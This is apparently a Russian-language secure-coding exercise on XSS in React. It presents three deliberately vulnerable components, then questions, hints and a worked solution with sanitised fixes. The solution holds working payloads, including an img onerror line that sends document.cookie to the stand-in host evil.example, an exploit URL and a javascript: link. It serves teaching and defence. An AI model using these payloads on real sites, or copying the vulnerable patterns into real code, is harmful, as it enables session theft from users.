# Блок 2 — Проблемный код. XSS в React

**Задача:** найти уязвимости. Не подглядывать в разбор, пока не попробовал.

---

## Файл 1: `CommentSection.jsx`

```jsx
import React, { useState, useEffect } from 'react';

export default function CommentSection() {
  const [comments, setComments] = useState([]);
  const [input, setInput] = useState('');

  useEffect(() => {
    // Загружаем комментарии с сервера
    fetch('/api/comments')
      .then(r => r.json())
      .then(data => setComments(data));
  }, []);

  const handleSubmit = async () => {
    await fetch('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: input }),
    });
    setInput('');
  };

  return (
    <div>
      <h2>Comments</h2>

      <input
        value={input}
        onChange={(e) => setInput(e.target.value)}
      />
      <button onClick={handleSubmit}>Send</button>

      <div className="comments-list">
        {comments.map(c => (
          <div key={c.id} className="comment">
            <div dangerouslySetInnerHTML={{ __html: c.text }} />
          </div>
        ))}
      </div>
    </div>
  );
}
```
## `CommentSection.jsx`

- Какой тип XSS здесь (reflected / stored / DOM-based)?
- Что конкретно делает уязвимым этот компонент? Назови строку.
- Опиши payload, который атакующий отправит в поле `input`, и что произойдёт, когда другой пользователь откроет страницу.
- Напиши **исправленную версию** компонента. Какой подход выберешь: экранирование, санитизация, оба? Обоснуй.

---

## Файл 2: `Profile.jsx`

```jsx
import React, { useEffect, useState } from 'react';
import { useSearchParams } from 'react-router-dom';

export default function Profile() {
  const [searchParams] = useSearchParams();
  const [bio, setBio] = useState('');

  useEffect(() => {
    const userName = searchParams.get('user') || 'guest';
    // Показываем приветствие
    document.getElementById('greeting').innerHTML = `Hello, ${userName}!`;

    fetch(`/api/profile?user=${userName}`)
      .then(r => r.json())
      .then(d => setBio(d.bio));
  }, [searchParams]);

  return (
    <div>
      <h1 id="greeting"></h1>
      <p>{bio}</p>
    </div>
  );
}
```
## `Profile.jsx`

- Какой тип XSS?
- Назови **source** и **sink** в этом коде.
- Какой URL должен открыть атакующий, чтобы сработал payload? Приведи конкретный пример (можно использовать `alert(document.cookie)`).
- Почему `<p>{bio}</p>` безопасен, а строка с `innerHTML` — нет? Сформулируй общее правило.
- Как исправить `innerHTML`-строку? Покажи код.

---

## Файл 3: `MarkdownViewer.jsx`

```jsx
import React from 'react';
import ReactMarkdown from 'react-markdown';

export default function MarkdownViewer({ source }) {
  return (
    <div className="markdown">
      <ReactMarkdown
        components={{
          a: ({ node, ...props }) => <a {...props} />,
          img: ({ node, ...props }) => <img {...props} />,
        }}
      >
        {source}
      </ReactMarkdown>
    </div>
  );
}
```
## `MarkdownViewer.jsx`

- Что произойдёт, если в `source` попадёт `[click me](javascript:alert(document.cookie))`?
- Что произойдёт, если попадёт `![img](x" onerror="alert(1))`?
- Почему кастомные компоненты `a` и `img` **не спасают** ситуацию?
- Как правильно санитизировать Markdown перед рендером? Опиши подход.

---

## CSP + `dangerouslySetInnerHTML`

В React-приложении **CSP с `'unsafe-inline'` в `script-src`**.
Сработает ли XSS через `dangerouslySetInnerHTML`?
- Payload `<script>alert(1)</script>` — сработает? Обоснуй.
- Payload `<img src=x onerror=alert(1)>` — сработает? Обоснуй.
- В чём разница между этими двумя случаями?

---



## Подсказки (смотреть только если застрял)

- **CommentSection:** обрати внимание на строку с `dangerouslySetInnerHTML`. Подумай, что придёт в `c.text`, если атакующий напишет `<img src=x onerror=...>`.
- **Profile:** source — `searchParams.get('user')`. Sink — `innerHTML`. Type? URL для эксплуатации?
- **MarkdownViewer:** проверь, ограничивает ли кастомный компонент `a` схемы URL (`javascript:`). Что будет с `![img](x" onerror="alert(1))`?

---

## Разбор (открыть после попытки)

### CommentSection.jsx

**Тип:** Stored DOM-based XSS.

**Уязвимая строка:**
```jsx
<div dangerouslySetInnerHTML={{ __html: c.text }} />
```

**Эксплуатация:** атакующий отправляет через UI или `curl` payload:
```
<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
```
Payload сохраняется в БД. Все посетители страницы комментариев отправляют свои cookies атакующему.

**Дополнительно:** API `POST /api/comments` принимает сырой payload — нужна санитизация и на сервере.

**Фикс:**
```jsx
import React, { useState, useEffect } from 'react';
import DOMPurify from 'dompurify';

const SANITIZE_CONFIG = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):/i,
};

function SafeComment({ text }) {
  const clean = DOMPurify.sanitize(text, SANITIZE_CONFIG);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

export default function CommentSection() {
  const [comments, setComments] = useState([]);
  const [input, setInput] = useState('');

  useEffect(() => {
    fetch('/api/comments').then(r => r.json()).then(setComments);
  }, []);

  const handleSubmit = async () => {
    await fetch('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: input }),
    });
    setInput('');
  };

  return (
    <div>
      <h2>Comments</h2>
      <input value={input} onChange={(e) => setInput(e.target.value)} />
      <button onClick={handleSubmit}>Send</button>
      <div className="comments-list">
        {comments.map(c => (
          <div key={c.id} className="comment">
            <SafeComment text={c.text} />
          </div>
        ))}
      </div>
    </div>
  );
}
```

### Profile.jsx

**Тип:** DOM-based XSS.

**Source:** `searchParams.get('user')` (читает `location.search`).
**Sink:** `document.getElementById('greeting').innerHTML`.

**Эксплуатация:**
```
https://app.example/profile?user=<img src=x onerror=alert(document.cookie)>
```

При открытии:
1. React смонтирует `Profile`.
2. `searchParams.get('user')` вернёт payload.
3. Строка попадёт в `innerHTML` → браузер спарсит `<img>` → сработает `onerror`.

**Почему `<p>{bio}</p>` безопасен:** React экранирует `{bio}` через HTML-escaping. `innerHTML` — нативный API, к которому React не имеет отношения.

**Дополнительная проблема:** `fetch('/api/profile?user=' + userName)` без `encodeURIComponent` — parameter injection.

**Фикс:**
```jsx
import React, { useEffect, useState } from 'react';
import { useSearchParams } from 'react-router-dom';

export default function Profile() {
  const [searchParams] = useSearchParams();
  const [bio, setBio] = useState('');
  const userName = searchParams.get('user') || 'guest';

  useEffect(() => {
    fetch(`/api/profile?user=${encodeURIComponent(userName)}`)
      .then(r => r.json())
      .then(d => setBio(d.bio));
  }, [userName]);

  return (
    <div>
      <h1>Hello, {userName}!</h1>
      <p>{bio}</p>
    </div>
  );
}
```

### MarkdownViewer.jsx

**Проблемы:**
1. `[click me](javascript:alert(document.cookie))` → **сработает**. Кастомный `a` прокидывает `href` без проверки схемы.
2. `![img](x" onerror="alert(1))` → **не сработает**. Вся строка попадёт в значение `src`, React экранирует кавычки в значении атрибута, `onerror` не появится.
3. Кастомные компоненты `a` и `img` **ничего не валидируют** — просто прокси, равносильно их отсутствию.
4. Дополнительный вектор: `<img src="https://evil.example/track?c=...">` — data exfiltration при рендере (referrer, IP, User-Agent).

**Фикс:**
```jsx
import ReactMarkdown from 'react-markdown';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
import remarkGfm from 'remark-gfm';

const schema = {
  ...defaultSchema,
  protocols: {
    ...defaultSchema.protocols,
    href: ['http', 'https', 'mailto'],
  },
};

export default function MarkdownViewer({ source }) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={[[rehypeSanitize, schema]]}
    >
      {source}
    </ReactMarkdown>
  );
}
```
